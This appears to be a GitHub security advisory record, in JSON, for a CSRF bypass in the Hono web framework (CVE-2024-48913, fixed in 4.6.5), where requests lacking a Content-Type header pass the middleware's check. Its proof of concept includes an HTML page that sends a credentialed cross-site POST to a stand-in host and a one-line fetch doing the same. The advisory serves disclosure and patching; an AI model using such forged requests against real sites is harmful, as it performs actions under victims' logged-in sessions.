[
  {
    "ghsa_id": "GHSA-2234-fmw7-43wr",
    "cve_id": "CVE-2024-48913",
    "url": "https://api.github.com/repos/honojs/hono/security-advisories/GHSA-2234-fmw7-43wr",
    "html_url": "https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr",
    "summary": "Bypass CSRF Middleware by a request without Content-Type header",
    "description": "### Summary\r\nBypass CSRF Middleware by a request without Content-Type herader.\r\n\r\n### Details\r\nAlthough the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.\r\n\r\nhttps://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89\r\n\r\n### PoC\r\n```server.js\r\n// server.js\r\nimport { Hono } from 'hono'\r\nimport { csrf }from 'hono/csrf'\r\nconst app = new Hono()\r\napp.use(csrf())\r\napp.get('/', (c) => {\r\n  return c.html('Hello Hono!')\r\n})\r\napp.post('/', async (c) => {\r\n  console.log(\"executed\")\r\n  return c.text( await c.req.text())\r\n})\r\nDeno.serve(app.fetch)\r\n```\r\n\r\n```poc.html\r\n<!-- PoC.html -->\r\n<script>\r\nasync function myclick() {\r\n    await fetch(\"http://evil.example.com\", {\r\n    method: \"POST\",\r\n    credentials: \"include\",\r\n    body:new Blob([`test`],{}),\r\n    });\r\n}\r\n</script>\r\n<input type=\"button\" onclick=\"myclick()\" value=\"run\" />\r\n```\r\n\r\nSimilarly, the fetch API does not add a Content-Type header for requests that do not include a Body.\r\n```PoC2.js\r\nawait fetch(\"http://localhost:8000\", { method: \"POST\", credentials: \"include\"});\r\n```\r\n\r\n### Impact\r\nBypass csrf protection implemented with hono csrf middleware.\r\n",
    "severity": "medium",
    "author": null,
    "publisher": {
      "login": "yusukebe",
      "id": 10682,
      "node_id": "MDQ6VXNlcjEwNjgy",
      "avatar_url": "https://avatars.githubusercontent.com/u/10682?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/yusukebe",
      "html_url": "https://github.com/yusukebe",
      "followers_url": "https://api.github.com/users/yusukebe/followers",
      "following_url": "https://api.github.com/users/yusukebe/following{/other_user}",
      "gists_url": "https://api.github.com/users/yusukebe/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/yusukebe/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/yusukebe/subscriptions",
      "organizations_url": "https://api.github.com/users/yusukebe/orgs",
      "repos_url": "https://api.github.com/users/yusukebe/repos",
      "events_url": "https://api.github.com/users/yusukebe/events{/privacy}",
      "received_events_url": "https://api.github.com/users/yusukebe/received_events",
      "type": "User",
      "user_view_type": "public",
      "site_admin": false
    },
    "identifiers": [
      {
        "value": "GHSA-2234-fmw7-43wr",
        "type": "GHSA"
      },
      {
        "value": "CVE-2024-48913",
        "type": "CVE"
      }
    ],
    "state": "published",
    "created_at": null,
    "updated_at": "2024-10-15T13:15:00Z",
    "published_at": "2024-10-15T08:21:06Z",
    "closed_at": null,
    "withdrawn_at": null,
    "submission": null,
    "vulnerabilities": [
      {
        "package": {
          "ecosystem": "npm",
          "name": "hono"
        },
        "vulnerable_version_range": "< 4.6.5",
        "patched_versions": "4.6.5",
        "vulnerable_functions": []
      }
    ],
    "cvss_severities": {
      "cvss_v3": {
        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N",
        "score": 5.9
      },
      "cvss_v4": {
        "vector_string": null,
        "score": null
      }
    },
    "cwes": [
      {
        "cwe_id": "CWE-352",
        "name": "Cross-Site Request Forgery (CSRF)"
      }
    ],
    "cwe_ids": [
      "CWE-352"
    ],
    "credits": [
      {
        "login": "KageShiron",
        "type": "reporter"
      }
    ],
    "credits_detailed": [
      {
        "user": {
          "login": "KageShiron",
          "id": 17571233,
          "node_id": "MDQ6VXNlcjE3NTcxMjMz",
          "avatar_url": "https://avatars.githubusercontent.com/u/17571233?v=4",
          "gravatar_id": "",
          "url": "https://api.github.com/users/KageShiron",
          "html_url": "https://github.com/KageShiron",
          "followers_url": "https://api.github.com/users/KageShiron/followers",
          "following_url": "https://api.github.com/users/KageShiron/following{/other_user}",
          "gists_url": "https://api.github.com/users/KageShiron/gists{/gist_id}",
          "starred_url": "https://api.github.com/users/KageShiron/starred{/owner}{/repo}",
          "subscriptions_url": "https://api.github.com/users/KageShiron/subscriptions",
          "organizations_url": "https://api.github.com/users/KageShiron/orgs",
          "repos_url": "https://api.github.com/users/KageShiron/repos",
          "events_url": "https://api.github.com/users/KageShiron/events{/privacy}",
          "received_events_url": "https://api.github.com/users/KageShiron/received_events",
          "type": "User",
          "user_view_type": "public",
          "site_admin": false
        },
        "type": "reporter",
        "state": "accepted"
      }
    ],
    "collaborating_users": null,
    "collaborating_teams": null,
    "private_fork": null,
    "cvss": {
      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N",
      "score": 5.9
    }
  }
]
